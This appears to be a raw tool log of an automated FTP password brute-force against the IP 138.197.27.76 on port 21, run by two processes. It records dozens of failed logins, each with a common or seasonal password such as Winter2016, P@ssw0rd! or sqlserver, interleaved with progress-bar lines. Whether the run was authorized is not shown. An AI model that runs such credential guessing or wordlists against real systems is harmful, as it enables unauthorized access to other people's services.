2025-10-24 01:36:59,873 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Autumn2015 (Incorrect: )
2025-10-24 01:37:00,001 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.2%[0m ETA: 113.3s Speed: 3 B/s | 186.7s | PID: 44124
2025-10-24 01:37:00,405 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.4%[0m ETA: 247.9s Speed: 127 B/s | 52.1s | PID: 44299
2025-10-24 01:37:00,454 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Autumn2014 (Incorrect: )
2025-10-24 01:37:00,803 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.5%[0m ETA: 112.5s Speed: 3 B/s | 187.5s | PID: 44124
2025-10-24 01:37:01,003 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Autumn2013 (Incorrect: )
2025-10-24 01:37:01,210 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.6%[0m ETA: 247.1s Speed: 129 B/s | 52.9s | PID: 44299
2025-10-24 01:37:01,539 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :autumn2017 (Incorrect: )
2025-10-24 01:37:01,604 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.8%[0m ETA: 111.7s Speed: 3 B/s | 188.3s | PID: 44124
2025-10-24 01:37:02,011 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.9%[0m ETA: 246.3s Speed: 129 B/s | 53.7s | PID: 44299
2025-10-24 01:37:02,069 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :autumn2016 (Incorrect: )
2025-10-24 01:37:02,406 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m63.0%[0m ETA: 110.9s Speed: 3 B/s | 189.1s | PID: 44124
2025-10-24 01:37:02,590 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :autumn2015 (Incorrect: )
2025-10-24 01:37:02,813 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m18.2%[0m ETA: 245.5s Speed: 131 B/s | 54.5s | PID: 44299
2025-10-24 01:37:03,113 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :autumn2014 (Incorrect: )
2025-10-24 01:37:03,206 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m63.3%[0m ETA: 110.1s Speed: 3 B/s | 189.9s | PID: 44124
2025-10-24 01:37:03,614 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m18.4%[0m ETA: 244.7s Speed: 131 B/s | 55.3s | PID: 44299
2025-10-24 01:37:03,631 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :autumn2013 (Incorrect: )
2025-10-24 01:37:04,008 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m63.6%[0m ETA: 109.3s Speed: 3 B/s | 190.7s | PID: 44124
2025-10-24 01:37:04,153 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2017 (Incorrect: )
2025-10-24 01:37:04,415 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m18.7%[0m ETA: 243.9s Speed: 132 B/s | 56.1s | PID: 44299
2025-10-24 01:37:04,681 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2016 (Incorrect: )
2025-10-24 01:37:04,809 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m63.8%[0m ETA: 108.5s Speed: 3 B/s | 191.5s | PID: 44124
2025-10-24 01:37:05,216 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.0%[0m ETA: 243.1s Speed: 132 B/s | 56.9s | PID: 44299
2025-10-24 01:37:05,219 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2015 (Incorrect: )
2025-10-24 01:37:05,610 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.1%[0m ETA: 107.7s Speed: 3 B/s | 192.3s | PID: 44124
2025-10-24 01:37:05,747 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2014 (Incorrect: )
2025-10-24 01:37:06,017 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.2%[0m ETA: 242.3s Speed: 134 B/s | 57.7s | PID: 44299
2025-10-24 01:37:06,303 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Winter2013 (Incorrect: )
2025-10-24 01:37:06,412 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.4%[0m ETA: 106.9s Speed: 3 B/s | 193.1s | PID: 44124
2025-10-24 01:37:06,818 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.5%[0m ETA: 241.5s Speed: 134 B/s | 58.5s | PID: 44299
2025-10-24 01:37:06,827 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2017 (Incorrect: )
2025-10-24 01:37:07,220 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.6%[0m ETA: 106.1s Speed: 3 B/s | 193.9s | PID: 44124
2025-10-24 01:37:07,364 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2016 (Incorrect: )
2025-10-24 01:37:07,620 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.8%[0m ETA: 240.7s Speed: 135 B/s | 59.3s | PID: 44299
2025-10-24 01:37:07,887 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2015 (Incorrect: )
2025-10-24 01:37:08,020 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m64.9%[0m ETA: 105.3s Speed: 3 B/s | 194.7s | PID: 44124
2025-10-24 01:37:08,413 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2014 (Incorrect: )
2025-10-24 01:37:08,421 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.0%[0m ETA: 239.9s Speed: 137 B/s | 60.1s | PID: 44299
2025-10-24 01:37:08,822 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m65.2%[0m ETA: 104.5s Speed: 3 B/s | 195.5s | PID: 44124
2025-10-24 01:37:08,952 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :winter2013 (Incorrect: )
2025-10-24 01:37:09,228 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.3%[0m ETA: 239.1s Speed: 137 B/s | 60.9s | PID: 44299
2025-10-24 01:37:09,474 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :P@55w0rd (Incorrect: )
2025-10-24 01:37:09,626 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m65.4%[0m ETA: 103.7s Speed: 3 B/s | 196.3s | PID: 44124
2025-10-24 01:37:10,026 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :P@ssw0rd! (Incorrect: )
2025-10-24 01:37:10,029 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.6%[0m ETA: 238.3s Speed: 138 B/s | 61.7s | PID: 44299
2025-10-24 01:37:10,428 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m65.7%[0m ETA: 102.9s Speed: 3 B/s | 197.1s | PID: 44124
2025-10-24 01:37:10,545 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :P@55w0rd! (Incorrect: )
2025-10-24 01:37:10,830 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.8%[0m ETA: 237.5s Speed: 138 B/s | 62.5s | PID: 44299
2025-10-24 01:37:11,080 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlsqlsqlsql (Incorrect: )
2025-10-24 01:37:11,230 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m66.0%[0m ETA: 102.1s Speed: 3 B/s | 197.9s | PID: 44124
2025-10-24 01:37:11,600 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :SQLSQLSQLSQL (Incorrect: )
2025-10-24 01:37:11,631 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.1%[0m ETA: 236.7s Speed: 139 B/s | 63.3s | PID: 44299
2025-10-24 01:37:12,031 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m66.2%[0m ETA: 101.3s Speed: 3 B/s | 198.7s | PID: 44124
2025-10-24 01:37:12,125 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Welcome123 (Incorrect: )
2025-10-24 01:37:12,432 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.4%[0m ETA: 235.9s Speed: 139 B/s | 64.1s | PID: 44299
2025-10-24 01:37:12,648 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Welcome1234 (Incorrect: )
2025-10-24 01:37:12,832 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████[38;5;240m░░░░░░░░░░░[0m] [38;5;160m66.5%[0m ETA: 100.5s Speed: 3 B/s | 199.5s | PID: 44124
2025-10-24 01:37:13,205 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Welcome1212 (Incorrect: )
2025-10-24 01:37:13,233 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.6%[0m ETA: 235.1s Speed: 141 B/s | 64.9s | PID: 44299
2025-10-24 01:37:13,635 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m66.8%[0m ETA: 99.7s Speed: 3 B/s | 200.3s | PID: 44124
2025-10-24 01:37:13,727 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :PassSql12 (Incorrect: )
2025-10-24 01:37:14,038 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.9%[0m ETA: 234.3s Speed: 140 B/s | 65.7s | PID: 44299
2025-10-24 01:37:14,245 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :network (Incorrect: )
2025-10-24 01:37:14,436 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.0%[0m ETA: 98.9s Speed: 3 B/s | 201.1s | PID: 44124
2025-10-24 01:37:14,818 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :networking (Incorrect: )
2025-10-24 01:37:14,839 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m22.2%[0m ETA: 233.5s Speed: 142 B/s | 66.5s | PID: 44299
2025-10-24 01:37:15,237 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.3%[0m ETA: 98.1s Speed: 3 B/s | 201.9s | PID: 44124
2025-10-24 01:37:15,402 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :networks (Incorrect: )
2025-10-24 01:37:15,640 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m22.4%[0m ETA: 232.7s Speed: 142 B/s | 67.3s | PID: 44299
2025-10-24 01:37:15,928 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :test (Incorrect: )
2025-10-24 01:37:16,040 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.6%[0m ETA: 97.3s Speed: 3 B/s | 202.7s | PID: 44124
2025-10-24 01:37:16,441 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m22.7%[0m ETA: 231.9s Speed: 141 B/s | 68.1s | PID: 44299
2025-10-24 01:37:16,482 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :testtest (Incorrect: )
2025-10-24 01:37:16,842 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m67.8%[0m ETA: 96.5s Speed: 3 B/s | 203.5s | PID: 44124
2025-10-24 01:37:17,037 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :testing (Incorrect: )
2025-10-24 01:37:17,243 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.0%[0m ETA: 231.1s Speed: 142 B/s | 68.9s | PID: 44299
2025-10-24 01:37:17,600 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :testing123 (Incorrect: )
2025-10-24 01:37:17,644 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.1%[0m ETA: 95.7s Speed: 3 B/s | 204.3s | PID: 44124
2025-10-24 01:37:18,048 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.2%[0m ETA: 230.3s Speed: 142 B/s | 69.7s | PID: 44299
2025-10-24 01:37:18,141 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :testsql (Incorrect: )
2025-10-24 01:37:18,449 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.4%[0m ETA: 94.9s Speed: 3 B/s | 205.1s | PID: 44124
2025-10-24 01:37:18,692 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :test-sql3 (Incorrect: )
2025-10-24 01:37:18,849 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.5%[0m ETA: 229.5s Speed: 143 B/s | 70.5s | PID: 44299
2025-10-24 01:37:19,210 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlsqlsqlsqlsql (Incorrect: )
2025-10-24 01:37:19,250 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.6%[0m ETA: 94.1s Speed: 3 B/s | 205.9s | PID: 44124
2025-10-24 01:37:19,650 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.8%[0m ETA: 228.7s Speed: 143 B/s | 71.3s | PID: 44299
2025-10-24 01:37:19,726 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :bankbank (Incorrect: )
2025-10-24 01:37:20,051 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m68.9%[0m ETA: 93.3s Speed: 3 B/s | 206.7s | PID: 44124
2025-10-24 01:37:20,263 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :default (Incorrect: )
2025-10-24 01:37:20,451 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.0%[0m ETA: 227.9s Speed: 144 B/s | 72.1s | PID: 44299
2025-10-24 01:37:20,788 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :test (Incorrect: )
2025-10-24 01:37:20,852 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.2%[0m ETA: 92.5s Speed: 3 B/s | 207.5s | PID: 44124
2025-10-24 01:37:21,252 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.3%[0m ETA: 227.1s Speed: 144 B/s | 72.9s | PID: 44299
2025-10-24 01:37:21,306 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :testing (Incorrect: )
2025-10-24 01:37:21,653 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.4%[0m ETA: 91.7s Speed: 3 B/s | 208.3s | PID: 44124
2025-10-24 01:37:21,849 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :password2 (Incorrect: )
2025-10-24 01:37:22,057 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.6%[0m ETA: 226.3s Speed: 145 B/s | 73.7s | PID: 44299
2025-10-24 01:37:22,406 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: : (Incorrect: )
2025-10-24 01:37:22,454 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m69.7%[0m ETA: 90.9s Speed: 3 B/s | 209.1s | PID: 44124
2025-10-24 01:37:22,858 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.8%[0m ETA: 225.5s Speed: 145 B/s | 74.5s | PID: 44299
2025-10-24 01:37:22,928 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :password (Incorrect: )
2025-10-24 01:37:23,260 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████[38;5;240m░░░░░░░░░░[0m] [38;5;160m70.0%[0m ETA: 90.0s Speed: 3 B/s | 210.0s | PID: 44124
2025-10-24 01:37:23,445 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Password1 (Incorrect: )
2025-10-24 01:37:23,659 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.1%[0m ETA: 224.7s Speed: 146 B/s | 75.3s | PID: 44299
2025-10-24 01:37:24,002 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Password1! (Incorrect: )
2025-10-24 01:37:24,062 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.3%[0m ETA: 89.2s Speed: 3 B/s | 210.8s | PID: 44124
2025-10-24 01:37:24,460 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.4%[0m ETA: 223.9s Speed: 146 B/s | 76.1s | PID: 44299
2025-10-24 01:37:24,540 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :P@ssw0rd (Incorrect: )
2025-10-24 01:37:24,862 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.5%[0m ETA: 88.4s Speed: 3 B/s | 211.6s | PID: 44124
2025-10-24 01:37:25,061 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :password12 (Incorrect: )
2025-10-24 01:37:25,261 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.6%[0m ETA: 223.1s Speed: 147 B/s | 76.9s | PID: 44299
2025-10-24 01:37:25,582 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :Password12 (Incorrect: )
2025-10-24 01:37:25,664 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m70.8%[0m ETA: 87.6s Speed: 3 B/s | 212.4s | PID: 44124
2025-10-24 01:37:26,063 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.9%[0m ETA: 222.3s Speed: 146 B/s | 77.7s | PID: 44299
2025-10-24 01:37:26,101 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :security (Incorrect: )
2025-10-24 01:37:26,467 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.1%[0m ETA: 86.8s Speed: 3 B/s | 213.2s | PID: 44124
2025-10-24 01:37:26,656 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :security1 (Incorrect: )
2025-10-24 01:37:26,868 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m26.2%[0m ETA: 221.5s Speed: 147 B/s | 78.5s | PID: 44299
2025-10-24 01:37:27,182 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :security3 (Incorrect: )
2025-10-24 01:37:27,268 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.3%[0m ETA: 86.0s Speed: 3 B/s | 214.0s | PID: 44124
2025-10-24 01:37:27,668 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m26.4%[0m ETA: 220.7s Speed: 147 B/s | 79.3s | PID: 44299
2025-10-24 01:37:27,704 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :secuirty3 (Incorrect: )
2025-10-24 01:37:28,072 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.6%[0m ETA: 85.2s Speed: 3 B/s | 214.8s | PID: 44124
2025-10-24 01:37:28,235 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :complex1 (Incorrect: )
2025-10-24 01:37:28,470 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m26.7%[0m ETA: 219.9s Speed: 148 B/s | 80.1s | PID: 44299
2025-10-24 01:37:28,750 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :complex2 (Incorrect: )
2025-10-24 01:37:28,874 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m71.9%[0m ETA: 84.4s Speed: 3 B/s | 215.6s | PID: 44124
2025-10-24 01:37:29,270 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :complex3 (Incorrect: )
2025-10-24 01:37:29,272 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.0%[0m ETA: 219.1s Speed: 149 B/s | 80.9s | PID: 44299
2025-10-24 01:37:29,674 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████████[38;5;240m░░░░░░░░░[0m] [38;5;160m72.1%[0m ETA: 83.6s Speed: 3 B/s | 216.4s | PID: 44124
2025-10-24 01:37:29,825 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sqlserver (Incorrect: )
